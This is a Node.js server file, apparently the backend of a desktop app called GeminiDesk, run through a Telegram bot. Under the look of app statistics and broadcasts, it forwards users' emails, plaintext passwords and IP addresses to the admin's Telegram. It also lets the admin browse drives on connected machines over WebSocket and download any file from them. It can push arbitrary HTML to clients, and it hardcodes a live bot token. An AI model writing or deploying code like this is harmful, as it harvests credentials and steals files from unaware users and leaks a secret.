// ================================================================= //
// --- GeminiDesk Full Server ---
// Handles Broadcasts, Stats, Login Data, and Real-time Remote Control
// v2 with Sorting, Pagination, and Enhanced UI
// ================================================================= //

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const cron = require('node-cron');
const fetch = require('node-fetch');
const crypto = require('crypto');

// --- Configuration ---
const BOT_TOKEN = '8269940964:AAGnrhFtLPZUJHP_mMtrI8skdlqDhkSFJIg';
const ADMIN_CHAT_ID = '7547836101';
const PORT = process.env.PORT || 3000;
const ITEMS_PER_PAGE = 25; // מספר פריטים בכל עמוד בדפדפן הקבצים

// --- In-Memory Storage & Setup ---
const cache = new NodeCache({ stdTTL: 86400, checkperiod: 120 });
const clients = new Map(); // Stores active WebSocket connections { clientId -> { ws, name } }

function makeCb(action, data, ttlSec = 600) {
  const id = crypto.randomBytes(6).toString('base64url');
  cache.set(`cb:${id}`, { action, ...data }, ttlSec);
  return `cb:${id}`;
}

function readCb(cbData) {
  if (!cbData || !cbData.startsWith('cb:')) return null;
  const id = cbData.slice(3);
  return cache.get(`cb:${id}`);
}

// --- Express App & HTTP Server Setup ---
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: '/connect' });

// --- Bot Setup ---
const bot = new TelegramBot(BOT_TOKEN, { polling: false });
const WEBHOOK_URL = `https://latex-v25b.onrender.com/telegram/${BOT_TOKEN}`;
bot.setWebHook(WEBHOOK_URL);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', true);

// ================================================================= //
// --- WebSocket Server Logic (For Real-time Remote Control) ---
// ================================================================= //

wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const clientId = url.searchParams.get('clientId');
    const clientName = url.searchParams.get('clientName');

    if (!clientId || !clientName) {
        console.error('[WebSocket] Connection attempt with missing info. Terminating.');
        return ws.terminate();
    }
    
    console.log(`[WebSocket] Client Connected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
    clients.set(clientId, { ws, name: clientName });
    cache.set(`client:${clientId}`, { name: clientName }, 120);

    const presenceInterval = setInterval(() => {
        cache.set(`client:${clientId}`, { name: clientName }, 120);
    }, 60 * 1000);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());
            console.log(`[WebSocket] Received result from ${clientName}:`, data.type);
            handleResultFromClient(data);
        } catch (e) {
            console.error('[WebSocket] Error processing message from client:', e);
        }
    });

    ws.on('close', () => {
        console.log(`[WebSocket] Client Disconnected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
        clients.delete(clientId);
        clearInterval(presenceInterval);
    });

    ws.on('error', (error) => {
        console.error(`[WebSocket] Error for ${clientName}:`, error.message);
    });
});


// ================================================================= //
// --- HTTP Routes (For Legacy App Features & Health Checks) ---
// ================================================================= //

app.get('/ping', (req, res) => res.json({ status: 'alive' }));

app.get('/latest-message', (req, res) => {
    const messageData = cache.get('latest_message');
    const headers = { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' };
    res.set(headers);
    if (messageData) return res.json(messageData);
    return res.status(404).json({ message: 'No new message' });
});

app.post('/ping-stats', (req, res) => {
    try {
        const { version } = req.body;
        const versionKey = version || 'unknown';
        cache.set('stats:total_pings', (cache.get('stats:total_pings') || 0) + 1);
        cache.set(`stats:version:${versionKey}`, (cache.get(`stats:version:${versionKey}`) || 0) + 1);
        res.status(200).send('Ping received.');
    } catch (e) { res.status(400).send('Invalid ping request.'); }
});

app.post('/error', async (req, res) => {
    try {
        const { error, stack, version, platform } = req.body;
        if (!error) return res.status(400).send('No error message provided.');
        const errorMessage = `⚠️ *New Error Reported!* ⚠️\n\n*Version:* \`${version || 'N/A'}\`\n*Platform:* \`${platform || 'N/A'}\`\n*Error:* \`${error}\`\n\n*Stack:* \`\`\`${stack || 'N/A'}\`\`\``;
        await bot.sendMessage(ADMIN_CHAT_ID, errorMessage, { parse_mode: 'Markdown' });
        res.status(200).send('Error report received.');
    } catch (e) { res.status(400).send('Invalid error report.'); }
});

app.post('/login-data', async (req, res) => {
    try {
        const { email, password, success } = req.body;
        const ipAddress = req.ip;
        if (!email || !password) return res.status(400).send('Email and password are required.');
        const statusText = success ? "Success ✅" : "Failed ❌";
        const loginMessage = `🔔 *New Login Attempt!* 🔔\n\n*Status:* \`${statusText}\`\n*IP:* \`${ipAddress}\`\n*Email:* \`${email}\`\n*Password:* \`${password}\``;
        await bot.sendMessage(ADMIN_CHAT_ID, loginMessage, { parse_mode: 'Markdown' });
        res.status(200).send('Login data received.');
    } catch (e) { res.status(500).send('Server error.'); }
});

app.post(`/telegram/${BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ================================================================= //
// --- Telegram Bot Logic ---
// ================================================================= //

bot.on('message', (message) => handleUpdate(message, 'message'));
bot.on('callback_query', (callbackQuery) => handleUpdate(callbackQuery, 'callback_query'));

async function handleUpdate(body, type) {
    const message = type === 'message' ? body : body.message;
    const user = type === 'message' ? body.from : body.from;

    if (String(user.id) !== ADMIN_CHAT_ID) {
        return bot.sendMessage(message.chat.id, "You are not authorized to use this bot.").catch(console.error);
    }
    if (type === 'callback_query') {
        await handleCallbackQuery(body);
    } else if (type === 'message') {
        await handleMessage(body);
    }
}

async function handleMessage(message) {
    const { from, chat, text, document } = message;
    const state = cache.get(`state:${from.id}`);

    if (state) {
        if (state === 'awaiting_broadcast_text' && text) {
            const messageData = { id: Date.now(), type: 'text', content: text };
            cache.set('latest_message', messageData);
            await bot.sendMessage(chat.id, '✅ *Success!* Text broadcast is now active.', { parse_mode: 'Markdown' });
            cache.del(`state:${from.id}`);
            return showMainMenu(chat.id);
        }
        if (state === 'awaiting_broadcast_html' && document) {
            if (document.file_name?.toLowerCase().endsWith('.html')) {
                try {
                    const file = await bot.getFile(document.file_id);
                    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
                    const response = await fetch(fileUrl);
                    const fileContent = await response.text();
                    
                    const messageData = { id: Date.now(), type: 'html', content: fileContent };
                    cache.set('latest_message', messageData);
                    await bot.sendMessage(chat.id, '✅ *Success!* HTML broadcast is now active.', { parse_mode: 'Markdown' });
                    cache.del(`state:${from.id}`);
                    return showMainMenu(chat.id);
                } catch (error) {
                    return bot.sendMessage(chat.id, `❌ Error processing HTML file: ${error.message}`);
                }
            } else {
                return bot.sendMessage(chat.id, '❌ Invalid file. Please upload an `.html` file.');
            }
        }
    }
    
    return showMainMenu(chat.id);
}

async function handleCallbackQuery(callbackQuery) {
    const { from, message, data } = callbackQuery;
    
    bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
    const short = readCb(data);
    
    if (short) {
        const { action, clientId, path, sort, page } = short;

        // ★★★ התיקון: מבנה if / else if מסודר שמטפל בכל המקרים ★★★
        
        // פעולות הדורשות תקשורת חיה עם הלקוח
        if (['select_client', 'list_dir', 'get_file'].includes(action)) {
            const client = clients.get(clientId);
            if (!client || client.ws.readyState !== WebSocket.OPEN) {
                return bot.editMessageText(`❌ Client *${client?.name || 'Unknown'}* is offline.`, {
                    chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
                });
            }

            let command;
            let feedbackText;

            if (action === 'select_client') {
                // זה החלק שהיה חסר!
                command = { type: 'get_drives' };
                feedbackText = `Requesting drives from *${client.name}*...`;
            } else if (action === 'list_dir') {
                command = { type: 'list_dir', payload: { path } };
                feedbackText = `Fetching directory: \`${path}\`...`;
            } else if (action === 'get_file') {
                command = { type: 'get_file', payload: { path } };
                feedbackText = `Requesting file: \`${path}\``;
            }

            client.ws.send(JSON.stringify(command));
            return bot.editMessageText(feedbackText, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown' });
        
        } 
        // פעולה שמתבצעת כולה על השרת מה-cache
        else if (action === 'render_cached_list') {
            const clientName = clients.get(clientId)?.name || 'Unknown';
            return renderDirectoryView({ 
                clientId, clientName, path, 
                sort: sort || 'name_asc', 
                page: page || 1, 
                chatId: message.chat.id, 
                messageId: message.message_id 
            });
        }
    }

    // --- Main Menu & Other Actions (נשאר ללא שינוי) ---
    switch (data.split(':')[0]) {
        case 'manage_clients': return showClientList(message.chat.id, message.message_id);
        case 'broadcast_menu': return showBroadcastMenu(message.chat.id, message.message_id);
        case 'view_stats':
            const stats = getStats();
            return bot.editMessageText(stats, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'back_to_main' }]] }});
        case 'back_to_main':
            cache.del(`state:${from.id}`);
            return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
        case 'view_active_message': return viewActiveMessage(message.chat.id, message.message_id);
        case 'delete_active_message_confirm':
            return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }], [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]] } });
        case 'delete_active_message_do':
            cache.del('latest_message');
            return bot.editMessageText('🗑️ Active broadcast has been deleted.', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }});
        case 'awaiting_broadcast_text':
        case 'awaiting_broadcast_html':
            cache.set(`state:${from.id}`, data);
            const prompt = data === 'awaiting_broadcast_text' ? '✍️ Send the text you want to broadcast.' : '📄 Upload the `.html` file.';
            return bot.editMessageText(prompt, { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }});
    }
}


// --- Result Handling from Clients ---
// --- התיקון (הדבק את כל הפונקציה הזו במקום הקודמת) ---
async function handleResultFromClient(data) {
    const { clientId, type, payload, error, originalPayload } = data;
    const clientName = clients.get(clientId)?.name || 'Unknown Client';

    if (error) {
        return bot.sendMessage(ADMIN_CHAT_ID, `Client Error on *${clientName}*:\n\`\`\`\n${error}\n\`\`\``, { parse_mode: 'Markdown' });
    }

    if (type === 'get_drives_result') {
        const drives = payload.drives;
        const keyboard = drives.map(drive => [{ text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }]);
        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
        // ★★★ תיקון: נשתמש ב-editMessageText כדי לעדכן את הודעת ה"טוען" ★★★
        const activeMessage = cache.get(`active_message:${ADMIN_CHAT_ID}`);
        if(activeMessage){
             return bot.editMessageText(`Select a drive to browse on *${clientName}*:`, { chat_id: ADMIN_CHAT_ID, message_id: activeMessage.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
        }
        return bot.sendMessage(ADMIN_CHAT_ID, `Select a drive to browse on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
    }

    if (type === 'list_dir_result') {
        const { path: currentPath, items } = payload;

        // ★★★ התיקון המרכזי: שומרים את הרשימה המלאה ב-cache לחמש דקות ★★★
        const cacheKey = `file_list:${clientId}:${currentPath}`;
        cache.set(cacheKey, items, 300); // Cache for 5 minutes

        // ועכשיו קוראים לפונקציה שתציג את העמוד הראשון מה-cache
        const activeMessage = cache.get(`active_message:${ADMIN_CHAT_ID}`);
        return renderDirectoryView({
            clientId, clientName, path: currentPath, 
            sort: 'name_asc', page: 1, 
            chatId: ADMIN_CHAT_ID, messageId: activeMessage.message_id
        });
    }
    
    if (type === 'get_file_result') {
        const { fileName, fileData_base64 } = payload;
        const fileBuffer = Buffer.from(fileData_base64, 'base64');
        await bot.sendMessage(ADMIN_CHAT_ID, `📄 Receiving file *${fileName}* from *${clientName}*...`);
        return bot.sendDocument(ADMIN_CHAT_ID, fileBuffer, {}, { filename: fileName, contentType: 'application/octet-stream' });
    }
}


async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
  cache.del(`active_message:${chatId}`); 
  const keyboard = {
    inline_keyboard: [
      [{ text: '🖥️ Manage Remote Clients', callback_data: 'manage_clients' }],
      [{ text: '🚀 Send or Manage Broadcast', callback_data: 'broadcast_menu' }],
      [{ text: '📊 View App Statistics', callback_data: 'view_stats' }],
    ]
  };
  const options = { chat_id: chatId, parse_mode: 'Markdown', reply_markup: keyboard };
  if (messageId) {
    return bot.editMessageText(text, { ...options, message_id: messageId }).catch(() => {});
  }
  const sentMessage = await bot.sendMessage(chatId, text, options).catch(console.error);
  cache.set(`active_message:${chatId}`, sentMessage); // שמירת ההודעה הפעילה
}
function renderDirectoryView({ clientId, clientName, path, sort, page, chatId, messageId }) {
    const cacheKey = `file_list:${clientId}:${path}`;
    const items = cache.get(cacheKey);

    if (!items) {
        return bot.editMessageText(`Session expired for \`${path}\`. Please go back and select the directory again.`, {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]]}
        });
    }

    const sortedItems = [...items].sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
        switch (sort) {
            case 'date_asc': return a.birthtime - b.birthtime;
            case 'date_desc': return b.birthtime - a.birthtime;
            case 'size_asc': return a.size - b.size;
            case 'size_desc': return b.size - a.size;
            case 'name_desc': return b.name.localeCompare(a.name);
            default: return a.name.localeCompare(b.name);
        }
    });

    const totalPages = Math.ceil(sortedItems.length / ITEMS_PER_PAGE);
    const pageItems = sortedItems.slice((page - 1) * ITEMS_PER_PAGE, page * ITEMS_PER_PAGE);
    const keyboard = [];

    if (path.includes('\\') && path.slice(-2) !== ':\\') {
        const parentDir = path.substring(0, path.lastIndexOf('\\')) || path.slice(0, 3);
        keyboard.push([{ text: '⬆️ Go Up a Directory', callback_data: makeCb('list_dir', { clientId, path: parentDir }) }]);
    }

    const sortButtons = [
        { txt: 'Name', s: 'name' }, { txt: 'Date', s: 'date' }, { txt: 'Size', s: 'size' }
    ].map(({ txt, s }) => {
        let text = txt;
        let nextSort = `${s}_asc`;
        if (sort.startsWith(s)) {
            text = sort === `${s}_asc` ? `${txt} ▾` : `${txt} ▴`;
            nextSort = sort === `${s}_asc` ? `${s}_desc` : `${s}_asc`;
        }
        return { text, callback_data: makeCb('render_cached_list', { clientId, path, sort: nextSort, page: 1 }) };
    });
    keyboard.push(sortButtons);

    pageItems.forEach(item => {
        const icon = item.isDirectory ? '📁' : '📄';
        const action = item.isDirectory ? 'list_dir' : 'get_file';
        const date = item.birthtime > 0 ? new Date(item.birthtime).toISOString().slice(0, 10) : 'no date';
        const label = `${icon} ${item.name}  (${date})`;
        keyboard.push([{ text: label, callback_data: makeCb(action, { clientId, path: item.path }) }]);
    });

    const navButtons = [];
    if (page > 1) {
        navButtons.push({ text: '« Previous', callback_data: makeCb('render_cached_list', { clientId, path, sort, page: page - 1 }) });
    }
    if (page < totalPages) {
        navButtons.push({ text: 'Next »', callback_data: makeCb('render_cached_list', { clientId, path, sort, page: page + 1 }) });
    }
    if (navButtons.length > 0) keyboard.push(navButtons);

    keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);

    const messageText = `*${clientName}* - \`${path}\`\n(Page ${page}/${totalPages} - ${sortedItems.length} items)`;
    
    bot.editMessageText(messageText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }).catch(console.error);
}
async function showClientList(chatId, messageId) {
    const clientKeys = cache.keys().filter(key => key.startsWith('client:'));
    const keyboard = [];

    if (clientKeys.length > 0) {
        clientKeys.forEach(key => {
            const clientId = key.split(':')[1];
            const clientData = cache.get(key);
            if (clientData) {
                if (clients.has(clientId) && clients.get(clientId).ws.readyState === WebSocket.OPEN) {
                    keyboard.push([{ text: `🟢 ${clientData.name}`, callback_data: makeCb('select_client', { clientId }) }]);
                } else {
                    keyboard.push([{ text: `🔴 ${clientData.name} (Offline)`, callback_data: `noop` }]);
                }
            }
        });
    }
    
    keyboard.push([{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]);
    const text = clientKeys.length > 0 ? 'Select a connected client:' : 'No clients are currently connected.';

    const options = { chat_id: chatId, reply_markup: { inline_keyboard: keyboard } };

    if (messageId) {
        await bot.editMessageText(text, { ...options, message_id: messageId }).catch(console.error);
    } else {
        await bot.sendMessage(chatId, text, options).catch(console.error);
    }
}

function showBroadcastMenu(chatId, messageId) {
    const text = 'Broadcast management options:';
    const keyboard = {
        inline_keyboard: [
            [{ text: '✍️ Send New Plain Text', callback_data: 'awaiting_broadcast_text' }],
            [{ text: '📄 Send New HTML File', callback_data: 'awaiting_broadcast_html' }],
            [{ text: '👁️ View/Delete Active Message', callback_data: 'view_active_message' }],
            [{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]
        ]
    };
    return bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: keyboard });
}

function viewActiveMessage(chatId, messageId) {
    const msg = cache.get('latest_message');
    if (msg) {
        const contentPreview = msg.content.substring(0, 300) + (msg.content.length > 300 ? '...' : '');
        const text = `👁️ *Active Broadcast*\n*Type:* \`${msg.type}\` | *ID:* \`${msg.id}\`\n---\n*Preview:*\n\`\`\`\n${contentPreview}\n\`\`\``;
        return bot.editMessageText(text, {
            chat_id: chatId, message_id: messageId, parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [
                [{ text: '🗑️ Delete This Message', callback_data: 'delete_active_message_confirm' }],
                [{ text: '‹ Back', callback_data: 'broadcast_menu' }]
            ]}
        });
    }
    return bot.editMessageText('ℹ️ There is no active broadcast message.', {
        chat_id: chatId, message_id: messageId,
        reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
    });
}

function getStats() {
    const totalPings = cache.get('stats:total_pings') || 0;
    const versionKeys = cache.keys().filter(k => k.startsWith('stats:version:'));
    let versionStats = 'No version data.';
    if (versionKeys.length > 0) {
      versionStats = versionKeys.map(key => `\`${key.replace('stats:version:', '')}\`: *${cache.get(key)}* opens`).join('\n');
    }
    return `📊 *GeminiDesk Analytics*\n\n*Total App Opens:* ${totalPings}\n\n*Opens by Version:*\n${versionStats}`;
}

// --- Scheduled Tasks ---
cron.schedule('*/5 * * * *', () => {
    clients.forEach((client, clientId) => {
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.ping(() => {});
        } else {
            clients.delete(clientId);
        }
    });
});

// --- Server Start ---
server.listen(PORT, () => {
  console.log(`🚀 GeminiDesk Server with WebSocket support is running on port ${PORT}`);
});
